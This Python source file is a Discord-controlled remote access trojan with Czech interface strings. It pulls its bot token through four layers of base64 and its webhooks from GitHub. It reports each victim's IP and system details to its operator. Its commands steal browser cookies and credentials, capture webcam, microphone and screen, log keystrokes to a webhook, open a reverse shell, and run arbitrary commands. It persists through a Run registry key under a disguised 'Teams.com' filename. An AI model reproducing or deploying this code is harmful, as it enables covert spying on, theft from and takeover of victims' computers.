import discord
from discord.ext import commands
from discord import app_commands
from discord.ext import tasks
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
import cv2
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
import aiohttp
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
import sqlite3
import pyaudio
from multiprocessing import Process
import subprocess
import tkinter as tk
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
import asyncio
import base64
import login, keybinds, execute
from moviepy.editor import VideoFileClip
import win32api
import win32con
import win32gui
import winsound
import socket
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import tempfile
import numpy as np



def SystemPath():
    global path

    full_path = os.path.realpath(__file__)
    path, filename = os.path.split(full_path)
SystemPath()

def GET_FRONTMAN_ROLE():
    global mention
    url = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/role.get"
    response = requests.get(url)
    
    if response.status_code == 200:
        role_id = response.text.strip()
        mention = f"<@&{role_id}>"
    else:
        mention = "@Nezn√°m√° role" 
GET_FRONTMAN_ROLE()
def GET_CURRENT_AGENT():
    global CURRENT_AGENT
    ƒå√∫rak = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/%C4%8D%C3%BArak.get"
    ƒå√∫rak_GET = requests.get(ƒå√∫rak).text
    CURRENT_AGENT = ƒå√∫rak_GET
GET_CURRENT_AGENT()
def GET_MAIN_CHANNEL():
    global CHANNEL
    Ch√≥nl = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/kan%C3%A1l.get"
    Ch√≥nl_GET = requests.get(Ch√≥nl).text
    CHANNEL = Ch√≥nl_GET
GET_MAIN_CHANNEL()
def GET_KEYLOGGER_WEBHOOK():
    global KEYLOGGER_WEBHOOK
    V√≠whook = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/kl%C3%A1vesnice.get"
    V√≠whook_GET = requests.get(V√≠whook).text
    KEYLOGGER_WEBHOOK = "https://discord.com/api/webhooks/"+V√≠whook_GET
GET_KEYLOGGER_WEBHOOK()
def GET_VIDEO_WEBHOOK():
    global VIDEO_WEBHOOK
    V√≠whook = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/video.get"
    V√≠whook_GET = requests.get(V√≠whook).text
    VIDEO_WEBHOOK = "https://discord.com/api/webhooks/"+V√≠whook_GET
GET_VIDEO_WEBHOOK()
def GET_GUILD():
    global GUILD
    G√≠ol = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/guild.get"
    G√≠ol_GET = requests.get(G√≠ol).text.strip()  # Odstran√≠ mezery a nov√© ≈ô√°dky
    GUILD = int(G√≠ol_GET)  # P≈ôevede na ƒç√≠slo
GET_GUILD()
def GET_FILEMONITOR_CHANNEL():
    global FILEMONITOR_CHANNEL
    Ch√≥nl = "https://raw.githubusercontent.com/miskajurostudios/GET/refs/heads/main/Br%C3%B3/H%C3%A1%C4%8Dek/FileControlChannel.get"
    Ch√≥nl_GET = requests.get(Ch√≥nl).text.strip()
    FILEMONITOR_CHANNEL = int(Ch√≥nl_GET)
GET_FILEMONITOR_CHANNEL()

def GET_TOKEN():
    global TOKEN
    Mezopot√°mie = "https://raw.githubusercontent.com/miskajurostudios/GET/main/Br%C3%B3/Mezopot%C3%A1mie.get"
    Mezopot√°mie_GET = requests.get(Mezopot√°mie).text
    TOKEN_GENERATION_ONE = Mezopot√°mie_GET
    TOKEN_GENERATION_TWO = base64.b64decode(TOKEN_GENERATION_ONE).decode()
    TOKEN_GENERATION_THREE = base64.b64decode(TOKEN_GENERATION_TWO).decode()
    TOKEN_GENERATION_FOUR = base64.b64decode(TOKEN_GENERATION_THREE).decode()
    TOKEN = base64.b64decode(TOKEN_GENERATION_FOUR).decode()
GET_TOKEN()

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, help_command=None)  # Tady u≈æ m√°me intents

    async def on_ready(self):
        await self.wait_until_ready()
    
        self.channel = self.get_channel(CHANNEL)
        if self.channel is None:
            return

        now = datetime.now()
        my_embed = discord.Embed(
            title=f"{MSG}",
            description=f"**Time: {now.strftime('%d/%m/%Y %H:%M:%S')}**",
            color=COLOR
        )
        my_embed.add_field(name="**IP**", value=execute.getIP(), inline=True)
        my_embed.add_field(name="**Bits**", value=execute.getBits(), inline=True)
        my_embed.add_field(name="**HostName**", value=execute.getHostname(), inline=True)
        my_embed.add_field(name="**OS**", value=execute.getOS(), inline=True)
        my_embed.add_field(name="**Username**", value=execute.getUsername(), inline=True)
        my_embed.add_field(name="**CPU**", value=execute.getCPU(), inline=False)
        my_embed.add_field(name="**Is Admin**", value=execute.isAdmin(), inline=True)
        my_embed.add_field(name="**Is VM**", value=execute.isVM(), inline=True)
        my_embed.add_field(name="**Auto Keylogger**", value="False", inline=True)

        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild=discord.Object(id=GUILD))

    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        try:
            await ctx.send(embed=my_embed)
        except discord.Forbidden:
            print("")


class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int):
        super().__init__()
        self.inv  = inv
        self.id = id

    @discord.ui.button(label="Interagovat", style=discord.ButtonStyle.blurple, emoji="üîó")
    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="Terminovat Spojen√≠", style=discord.ButtonStyle.gray, emoji="‚ùå")
    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)
        await bot.close()        
        sys.exit()

    @discord.ui.button(label="Kamera", style=discord.ButtonStyle.gray, emoji="üì∏")
    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = execute.webshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking photo to Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_messagey(embed=my_embed)

    @discord.ui.button(label="Processes", style=discord.ButtonStyle.gray, emoji="üìä")
    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = execute.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"Result ~ ```\n{result}\n```")


    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="üñºÔ∏è")
    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = execute.screenshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)
    

    @discord.ui.button(label="√ödaje", style=discord.ButtonStyle.gray, emoji="üîë")
    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = execute.creds()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    
    @discord.ui.button(label="Persistence", style=discord.ButtonStyle.gray, emoji="üîÅ")
    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = execute.persistent()
        if result:
            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{self.id}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{self.id}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

bot = Bot()


@bot.event
async def on_ready():
    channel_id = int(CHANNEL)
    channel = bot.get_channel(channel_id)

    message = f"<< {mention} >>"
    my_embed = discord.Embed(title=f"[TRIAL ‚ö°] Agent #{ID} online", description=f"Agent #{ID} je online", color=discord.Color.blue())
    my_embed.add_field(name=f"**IP Adresa**", value=execute.getIP(), inline=True)
    my_embed.add_field(name="**Operaƒçn√≠ System**", value=execute.getOS(), inline=True)
    my_embed.add_field(name="**U≈æivatelsk√© Jm√©no**", value=execute.getUsername(), inline=True)
    my_view = InteractButton("Interact", ID)
    await channel.send(message)
    await channel.send(embed=my_embed, view=my_view)




@bot.hybrid_command(name = "interagovat", with_app_command = True, description = "Interagovat s agentem")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, id:int):
    global CURRENT_AGENT 
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"Interaktuje≈° s agentem #{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)



@bot.hybrid_command(name="dump-cookies", with_app_command=True, description="Dump Chrome/Edge cookies")
@app_commands.guilds(GUILD)
async def dump_cookies(ctx):
    user = os.getlogin()
    cookies_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    if not os.path.exists(cookies_path):
        cookies_path = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    
    temp_path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\cookies_dump.db"
    shutil.copy2(cookies_path, temp_path)

    await ctx.send(file=discord.File(temp_path, "cookies.db"))
    os.remove(temp_path)



@bot.hybrid_command(name="hide-infiles", with_app_command=True, description="Schov√° program do syst√©mov√Ωch soubor≈Ø a p≈ôid√° persistenci")
@app_commands.guilds(GUILD)
async def hide_infiles(ctx):
    backdoor_location = os.environ["APPDATA"] + "\\Teams.com"

    if os.path.exists(backdoor_location):
        await ctx.send("‚úÖ Ji≈æ schov√°no..")
        return

    try:
        shutil.copyfile(sys.executable, backdoor_location)
        sp.call(
            fr'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "{backdoor_location}" /f',
            shell=True
        )

        await ctx.send("‚úÖ Schov√°no v syst√©mov√Ωch souborech a p≈ôid√°na persistence.")
    except Exception as e:
        await ctx.send(f"‚ùå Chyba: {e}")



@bot.hybrid_command(name = "stop-interacting", with_app_command = True, description = "P≈ôestane (background) interagovat s agentem")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context):
    global CURRENT_AGENT 
    CURRENT_AGENT = 0
    my_embed = discord.Embed(title=f"Background Agent", color=0x00FF00)
    await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Spust√≠ zadan√Ω cmd command.")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, command:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.cmd(command)
        if len(result) > 2000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"Result ~ ```{result}```")


@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Spust√≠ zadan√Ω cmd command na v≈°ech agentech.")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = execute.cmd(command)
    if len(result) > 2000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply(f"Result ~ ```{result}```")


@bot.hybrid_command(name = "webcam", with_app_command = True, description = "Po≈ô√≠d√≠ fotku kamery")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"Pros√≠m pou≈æ√≠ **!webcam {ID}** m√≠sto / commandu", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = execute.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Chyba p≈ôi po≈ôizov√°n√≠ fotky agenta #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "cd", with_app_command = True, description = "Zmƒõn um√≠stƒõn√≠ (Change Directory) - cmd")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"√öspƒõ≈°nƒõ zmƒõnƒõno um√≠stƒõn√≠ na: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Chybiƒçka p≈ôi zmƒõnƒõ um√≠stƒõn√≠:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "proc", with_app_command = True, description = "Zobraz√≠ v≈°echny procesy na agentovƒõ za≈ô√≠zen√≠")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.process()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"Result ~ ```\n{result}\n```")
    

@bot.hybrid_command(name = "upload", with_app_command = True, description = "Nahr√°t agentovy soubor do za≈ô√≠zen√≠")
@app_commands.guilds(GUILD)
async def upload(ctx: commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.upload(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} bylo √∫spƒõ≈°nƒõ nahr√°no k agentovy #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Po≈ô√≠d√≠ screenshot agentova poƒç√≠taƒçe")
@app_commands.guilds(GUILD)
async def screenshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.screenshot()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    
@bot.hybrid_command(name = "creds", with_app_command = True, description = "Vezme √∫daje z poƒç√≠taƒçe agenta")
@app_commands.guilds(GUILD)
async def creds(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.creds()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    
@bot.hybrid_command(name = "persistence", with_app_command = True, description = "P≈ôid√° program jako startup k agentovy do registeru")
@app_commands.guilds(GUILD)
async def persistent(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.persistent()
        if result:
            my_embed = discord.Embed(title=f"√öspƒõ≈°nƒõ p≈ôid√°n program do start-up agentovy#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Chyba p≈ôi p≈ôid√°n√≠ programu do start-up agentovy#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    
@bot.hybrid_command(name = "ls", with_app_command = True, description = "Zobrat√≠ v≈°echno online agenty")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"Pros√≠m pou≈æ√≠ **!ls** mimo '/' commandu.", color=0xFF0000)
         await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"Agent #{ID}   IP Adresa: {execute.getIP()}", color=0xADD8E6)
        my_embed.add_field(name="**Operaƒçn√≠ System**", value=execute.getOS(), inline=True)
        my_embed.add_field(name="**U≈æivatelsk√© Jm√©no**", value=execute.getUsername(), inline=True)
        view = InteractButton("Interact", ID)
        await ctx.reply(embed=my_embed, view=view)


@bot.hybrid_command(name = "download", with_app_command = True, description = "St√°hne soubory od agenta")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"**Pokou≈æ√≠≈° se st√°hnout od agenta #{ID}**:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"√öspƒõ≈°nƒõ sta≈æeny soubory od agenta #{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "terminate", with_app_command = True, description = "Terminuje spojen√≠ mezi agentem")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        my_embed = discord.Embed(title=f"Spojen√≠ s agentem #{ID} bylo zastaveno", color=0x00FF00)
        await ctx.reply(embed=my_embed)
        await bot.close()        
        sys.exit()
    

@bot.hybrid_command(name = "selfdestruct", with_app_command = True, description = "Vyma≈æe agenta ~ sebedestrukce")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"Sebedestrukce agenta #{ID} byla √∫spƒõ≈°n√°", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Sebedestrukce agenta #{ID} nebyla √∫spƒõ≈°n√°: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

    
@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Vytvo≈ô√≠ revshell (ovl√°dan√≠ terminalu nad√°lku) na agentovƒõ poƒç√≠taƒçi")
@app_commands.guilds(GUILD)
async def location(ctx: commands.Context, ip:str, port:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.revshell(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Attempting to Establish Reverse Shell on Agent#{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Nahr√°v√° mikrofon agenta podobu vybran√©ho ƒçasu")
@app_commands.guilds(GUILD)
async def recordmic(ctx: commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title="Pou≈æ√≠ **!recordmic 'time'** m√≠sto /recordmic", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = execute.recordmic(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error p≈ôi pokusu o odposlech agenta #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Zastav√≠ proces na agentovƒõ poƒç√≠taƒçi pomoc√≠ PID")
@app_commands.guilds(GUILD)
async def killproc(ctx: commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = execute.killproc(pid)
        if result:
            my_embed = discord.Embed(title=f"Process {pid} killed on Agent#{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error while killing process {pid} on Agent#{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)


@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Spust√≠ (nebo zastav√≠) keylogger na poƒç√≠taƒçi agenta")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, mode:str ,interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = keybinds.Keylogger(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF000000000000))


@bot.hybrid_command(name="shutdown", with_app_command=True, description="Vypne poƒç√≠taƒç agenta")
@app_commands.guilds(GUILD)
async def shutdown(ctx):
    await ctx.send(f"üõë **Vyp√≠n√°n√≠ poƒç√≠taƒç agenta #{ID}...**")
    subprocess.run("shutdown /s /t 5", shell=True)

@bot.hybrid_command(name="restart", with_app_command=True, description="Restartuje poƒç√≠taƒç agenta")
@app_commands.guilds(GUILD)
async def restart(ctx):
    await ctx.send(f"üîÑ **Restartov√°n√≠ poƒç√≠taƒç agenta #{ID}...**")
    subprocess.run("shutdown /r /t 5", shell=True)

@bot.hybrid_command(name="sleep", with_app_command=True, description="Usp√≠ poƒç√≠taƒç agenta")
@app_commands.guilds(GUILD)
async def sleep(ctx):
    await ctx.send(f"üò¥ **Usp√°v√°n√≠ poƒç√≠taƒç agenta #{ID}...**")
    subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)

@bot.hybrid_command(name="logout", with_app_command=True, description="Odhl√°s√≠ agenta z Windows")
@app_commands.guilds(GUILD)
async def logout(ctx):
    await ctx.send(f"üëã **Odhla≈°ov√°n√≠ agenta #{ID} z Windows...**")
    subprocess.run("shutdown /l", shell=True)



StartTeams = True

if StartTeams == True:
    config = execute.createConfig()
    ID = execute.id()
    if config:
        MSG = f"Nov√Ω agent se p≈ôipojil #{ID}"
        COLOR = 0x00ff00
    else:
        MSG =f"Agent se navr√°til #{ID}"
        COLOR = 0x0000FF

    bot.run(f"{TOKEN}")
